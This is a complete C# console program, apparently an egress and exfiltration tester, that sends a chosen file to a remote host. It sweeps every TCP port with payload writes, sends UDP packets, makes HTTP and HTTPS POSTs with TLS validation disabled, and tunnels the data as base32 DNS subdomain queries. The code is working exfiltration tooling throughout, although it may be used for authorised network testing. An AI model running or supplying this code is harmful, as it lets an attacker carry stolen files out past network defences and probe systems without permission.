// Outfaze.Client - Program.cs
// Paste into the Outfaze.Client console project (ImplicitUsings disabled, explicit Program.Main)

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Outfaze.Client
{
    internal class Program
    {
        private static async Task<int> Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: egress-n-exfil <host_or_ip> <dns_domain_for_exfil> [payload-file]");
                Console.WriteLine("Example: egress-n-exfil 198.51.100.5 exfil.example.com payload.bin");
                return 1;
            }

            var host = args[0];
            var dnsDomain = args[1];
            byte[] payload;
            if (args.Length >= 3 && File.Exists(args[2]))
                payload = File.ReadAllBytes(args[2]);
            else
                payload = Encoding.UTF8.GetBytes($"test-exfil-{DateTime.UtcNow:o}");

            var tester = new EgressTester(host, dnsDomain, payload, timeoutMs: 5000);
            var ports = Enumerable.Range(1, 65535).ToArray(); 
        // var ports = new int[] { 21, 22, 23, 25, 53, 80, 110, 123, 143, 161, 443, 445, 587, 1433, 1521, 3306, 3389, 4444, 5000, 8080, 8443 };

            await tester.TestPingAsync();
            await tester.TestTcpPortsAsync(ports);
            await tester.TestUdpPortsAsync(new int[] { 53, 123, 5000 });
            await tester.TestHttpExfilAsync("/collect", useHttps: false);
            await tester.TestHttpExfilAsync("/collect", useHttps: true, ignoreTls: true);
            await tester.TestDnsExfilAsync();
            Console.WriteLine("All tests completed.");
            return 0;
        }
    }

    internal class EgressTester
    {
        public string HostOrIp { get; }
        public string DnsDomainForExfil { get; }
        public byte[] Payload { get; }
        public int TimeoutMs { get; }

        private HttpClient http;

        public EgressTester(string hostOrIp, string dnsDomainForExfil, byte[] payload, int timeoutMs = 5000)
        {
            HostOrIp = hostOrIp;
            DnsDomainForExfil = dnsDomainForExfil;
            Payload = payload ?? Array.Empty<byte>();
            TimeoutMs = timeoutMs;
            http = new HttpClient() { Timeout = TimeSpan.FromMilliseconds(timeoutMs) };
        }

        public async Task TestTcpPortsAsync(IEnumerable<int> ports)
        {
            Console.WriteLine("=== TCP port checks ===");
            var tasks = ports.Select(p => CheckTcpPortAsync(p));
            await Task.WhenAll(tasks);
        }

        private async Task CheckTcpPortAsync(int port)
        {
            var sw = Stopwatch.StartNew();
            var cts = new CancellationTokenSource(TimeoutMs); 
            try
            {
                var tcp = new TcpClient();
                var connectTask = tcp.ConnectAsync(HostOrIp, port);
                var completed = await Task.WhenAny(connectTask, Task.Delay(TimeoutMs, cts.Token));
                if (completed != connectTask || !tcp.Connected)
                {
                    Console.WriteLine($"TCP {port,5}: blocked/timeout ({TimeoutMs}ms)");
                    return;
                }

                sw.Stop();
                Console.WriteLine($"TCP {port,5}: allowed (connect rtt {sw.ElapsedMilliseconds}ms)");

                if (Payload.Length > 0)
                {
                    try
                    {
                        var ns = tcp.GetStream();
                        await ns.WriteAsync(Payload, 0, Payload.Length, cts.Token);
                        Console.WriteLine($"TCP {port,5}: payload sent ({Payload.Length} bytes)");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"TCP {port,5}: payload send failed: {ex.Message}");
                    }
                }

                tcp.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"TCP {port,5}: blocked/error - {ex.Message}");
            }
            finally
            {
                cts.Dispose(); 
            }
        }

        public async Task TestUdpPortsAsync(IEnumerable<int> ports)
        {
            Console.WriteLine("=== UDP send checks ===");
            var tasks = ports.Select(p => CheckUdpPortAsync(p));
            await Task.WhenAll(tasks);
        }

        private async Task CheckUdpPortAsync(int port)
        {
            var udp = new UdpClient();
            var sw = Stopwatch.StartNew();
            try
            {
                var sendTask = udp.SendAsync(Payload, Payload.Length, HostOrIp, port);
                var completed = await Task.WhenAny(sendTask, Task.Delay(TimeoutMs));
                if (completed != sendTask)
                {
                    Console.WriteLine($"UDP  {port,5}: no-send/timeout ({TimeoutMs}ms)");
                    return;
                }

                sw.Stop();
                Console.WriteLine($"UDP  {port,5}: sent ({Payload.Length} bytes) rtt {sw.ElapsedMilliseconds}ms");

                udp.Client.ReceiveTimeout = 500;
                try
                {
                    var from = await udp.ReceiveAsync();
                    Console.WriteLine($"UDP  {port,5}: received {from.Buffer.Length} bytes from {from.RemoteEndPoint}");
                }
                catch (SocketException) { /* no reply */ }
                catch (Exception) { /* ignore */ }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"UDP  {port,5}: error - {ex.Message}");
            }
        }

        public async Task TestHttpExfilAsync(string path = "/collect", bool useHttps = false, bool ignoreTls = false)
        {
            Console.WriteLine("=== HTTP(S) exfil check ===");
            var scheme = useHttps ? "https" : "http";
            var uri = new Uri($"{scheme}://{HostOrIp}{path}");

            if (ignoreTls && useHttps)
            {
                var handler = new HttpClientHandler { ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator };
                http = new HttpClient(handler) { Timeout = TimeSpan.FromMilliseconds(TimeoutMs) };
            }

            try
            {
                var content = new ByteArrayContent(Payload);
                var sw = Stopwatch.StartNew();
                var resp = await http.PostAsync(uri, content);
                sw.Stop();
                Console.WriteLine($"HTTP{(useHttps ? "S" : "")} POST {uri} => {(int)resp.StatusCode} in {sw.ElapsedMilliseconds}ms");
                var body = await resp.Content.ReadAsStringAsync();
                Console.WriteLine($"HTTP response body (first 200 chars): {body?.Substring(0, Math.Min(200, body.Length))}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"HTTP{(useHttps ? "S" : "")} POST {uri} failed: {ex.Message}");
            }
        }

        public async Task TestDnsExfilAsync(int chunkSize = 50)
        {
            Console.WriteLine("=== DNS exfil (subdomain) ===");
            if (string.IsNullOrEmpty(DnsDomainForExfil))
            {
                Console.WriteLine("No DNS domain configured for exfil test.");
                return;
            }

            string b32 = Base32Encode(Payload);
            var labels = ChunkString(b32, Math.Min(chunkSize, 50));
            int i = 0;
            foreach (var lbl in labels)
            {
                var qname = $"{lbl}.{i}.{DnsDomainForExfil}";
                try
                {
                    var sw = Stopwatch.StartNew();
                    var ips = await Dns.GetHostAddressesAsync(qname);
                    sw.Stop();
                    Console.WriteLine($"DNS query {qname} => {ips.Length} answers in {sw.ElapsedMilliseconds}ms");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"DNS query {qname} failed: {ex.Message}");
                }
                i++;
                await Task.Delay(100);
            }
            Console.WriteLine("DNS exfil test completed (check your authoritative logs).");
        }

        public async Task TestPingAsync()
        {
            Console.WriteLine("=== ICMP ping ===");
            try
            {
                var p = new Ping();
                var reply = await p.SendPingAsync(HostOrIp, TimeoutMs);
                Console.WriteLine($"Ping to {HostOrIp} => {reply.Status}, RTT {reply.RoundtripTime}ms");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ping failed: {ex.Message}");
            }
        }

       
        private static IEnumerable<string> ChunkString(string s, int chunkSize)
        {
            for (int i = 0; i < s.Length; i += chunkSize)
                yield return s.Substring(i, Math.Min(chunkSize, s.Length - i));
        }

        private static string Base32Encode(byte[] data)
        {
            if (data == null || data.Length == 0) return string.Empty;
            const string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
            var bits = 0;
            var value = 0;
            var output = new StringBuilder();
            foreach (var b in data)
            {
                value = (value << 8) | b;
                bits += 8;
                while (bits >= 5)
                {
                    output.Append(alphabet[(value >> (bits - 5)) & 0x1F]);
                    bits -= 5;
                }
            }
            if (bits > 0) output.Append(alphabet[(value << (5 - bits)) & 0x1F]);
            return output.ToString();
        }
    }

}
